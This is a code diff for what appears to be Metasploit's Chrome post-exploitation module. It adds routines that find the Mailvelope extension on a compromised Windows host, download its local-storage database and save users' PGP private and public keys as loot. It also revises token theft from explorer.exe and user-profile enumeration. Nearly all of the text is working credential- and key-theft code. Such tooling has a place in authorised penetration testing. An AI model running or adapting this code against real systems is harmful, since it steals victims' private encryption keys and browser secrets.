@@ -29,7 +29,8 @@ class Metasploit3 < Msf::Post
 				[
 					'Sven Taute', #Original (Meterpreter script)
 					'sinn3r',     #Metasploit post module
-					'Kx499'       #x64 support
+					'Kx499',      #x64 support
+					'mubix'       #Parse extensions
 				]
 		))
 
@@ -38,6 +39,68 @@ class Metasploit3 < Msf::Post
 				OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', false]),
 			], self.class)
 	end
+
+	def extension_mailvelope_parse_key(data)
+		return data.gsub("\x00","").tr("[]","").gsub("\\r","").gsub("\"","").gsub("\\n","\n")
+	end
+
+	def extension_mailvelope_store_key(name, value)
+		return unless name =~ /(private|public)keys/i
+
+		priv_or_pub = $1
+
+		keys = value.split(",")
+		print_good("==> Found #{keys.size} #{priv_or_pub} key(s)!")
+		keys.each do |key|
+			key_data = extension_mailvelope_parse_key(key)
+			vprint_good(key_data)
+			path = store_loot(
+				"chrome.mailvelope.#{priv_or_pub}", "text/plain", session, key_data, "#{priv_or_pub}.key", "Mailvelope PGP #{priv_or_pub.capitalize} Key")
+			print_status("==> Saving #{priv_or_pub} key to: #{path}")
+		end
+	end
+
+	def extension_mailvelope(username, extname)
+		chrome_path = @profiles_path + "\\" + username + @data_path
+		maildb_path = chrome_path + "/Local Storage/chrome-extension_#{extname}_0.localstorage"
+		if file_exist?(maildb_path) == false
+			print_error("==> Mailvelope database not found")
+			return
+		end
+		print_status("==> Downloading Mailvelope database...")
+		local_path = store_loot("chrome.ext.mailvelope", "text/plain", session, "chrome_ext_mailvelope")
+		session.fs.file.download_file(local_path, maildb_path)
+		print_status("==> Downloaded to #{local_path}")
+
+		maildb = SQLite3::Database.new(local_path)
+		columns, *rows = maildb.execute2("select * from ItemTable;")
+		maildb.close
+
+		rows.each do |name, value|
+			extension_mailvelope_store_key(name, value)
+		end
+	end
+
+
+
+	def parse_prefs(username, filepath)
+		prefs = ''
+		File.open(filepath, 'rb') do |f|
+			prefs = f.read
+		end
+		results = ActiveSupport::JSON.decode(prefs)
+		print_status("Extensions installed: ")
+		results['extensions']['settings'].each do |name,values|
+			if values['manifest']
+				print_status("=> #{values['manifest']['name']}")
+				if values['manifest']['name'] =~ /mailvelope/i
+					print_good("==> Found Mailvelope extension, extracting PGP keys")
+					extension_mailvelope(username, name)
+				end
+			end
+		end
+	end
+
 
 	def decrypt_data(data)
 		rg = session.railgun
@@ -77,6 +140,10 @@ class Metasploit3 < Msf::Post
 		)
 
 		@chrome_files.each do |item|
+			if item[:in_file] == "Preferences"
+				parse_prefs(username, item[:raw_file])
+			end
+
 			next if item[:sql] == nil
 			next if item[:raw_file] == nil
 
@@ -122,9 +189,7 @@ class Metasploit3 < Msf::Post
 			remote_path = chrome_path + '\\' + f
 
 			#Verify the path before downloading the file
-			begin
-				x = session.fs.file.stat(remote_path)
-			rescue
+			if file_exist?(remote_path) == false
 				print_error("#{f} not found")
 				next
 			end
@@ -152,17 +217,12 @@ class Metasploit3 < Msf::Post
 		current_pid = session.sys.process.open.pid
 		target_pid = session.sys.process["explorer.exe"]
 		return if target_pid == current_pid
-
-		if not session.incognito
-			session.core.use("incognito")
-
-			if not session.incognito
-				print_error("Unable to load incognito")
-				return false
-			end
+		if target_pid.to_s.empty?
+			print_warning("No explorer.exe process to impersonate.")
+			return
 		end
 
-		print_status("Impersonating token: #{target_pid.to_s}")
+		print_status("Impersonating token: #{target_pid}")
 		begin
 			session.sys.config.steal_token(target_pid)
 			return true
@@ -217,7 +277,6 @@ class Metasploit3 < Msf::Post
 		]
 
 		@old_pid = nil
-		@host_info = session.sys.config.sysinfo
 		migrate_success = false
 
 		# If we can impersonate a token, we use that first.
@@ -230,37 +289,39 @@ class Metasploit3 < Msf::Post
 		host = session.session_host
 
 		#Get Google Chrome user data path
-		sysdrive = session.fs.file.expand_path("%SYSTEMDRIVE%")
-		os = @host_info['OS']
-		if os =~ /(Windows 7|2008|Vista)/
-			@profiles_path = sysdrive + "\\Users\\"
+		sysdrive = expand_path("%SYSTEMDRIVE%").strip
+		if directory?("#{sysdrive}\\Users")
+			@profiles_path = "#{sysdrive}/Users"
 			@data_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
-		elsif os =~ /(2000|NET|XP)/
-			@profiles_path = sysdrive + "\\Documents and Settings\\"
+		elsif directory?("#{sysdrive}\\Documents and Settings")
+			@profiles_path = "#{sysdrive}/Documents and Settings"
 			@data_path = "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default"
 		end
 
 		#Get user(s)
 		usernames = []
-		uid = session.sys.config.getuid
 		if is_system?
 			print_status("Running as SYSTEM, extracting user list...")
-			print_error("(Automatic decryption will not be possible. You might want to manually migrate, or set \"MIGRATE=true\")")
+			print_warning("(Automatic decryption will not be possible. You might want to manually migrate, or set \"MIGRATE=true\")")
 			session.fs.dir.foreach(@profiles_path) do |u|
-				usernames << u if u !~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
+				not_actually_users = [
+					".", "..", "All Users", "Default", "Default User", "Public", "desktop.ini",
+					"LocalService", "NetworkService"
+				]
+				usernames << u unless not_actually_users.include?(u)
 			end
 			print_status "Users found: #{usernames.join(", ")}"
 		else
+			uid = session.sys.config.getuid
 			print_status "Running as user '#{uid}'..."
-			usernames << session.fs.file.expand_path("%USERNAME%")
+			usernames << expand_path("%USERNAME%").strip
 		end
-
 
 		has_sqlite3 = true
 		begin
 			require 'sqlite3'
 		rescue LoadError
-			print_error("SQLite3 is not available, and we are not able to parse the database.")
+			print_warning("SQLite3 is not available, and we are not able to parse the database.")
 			has_sqlite3 = false
 		end
 
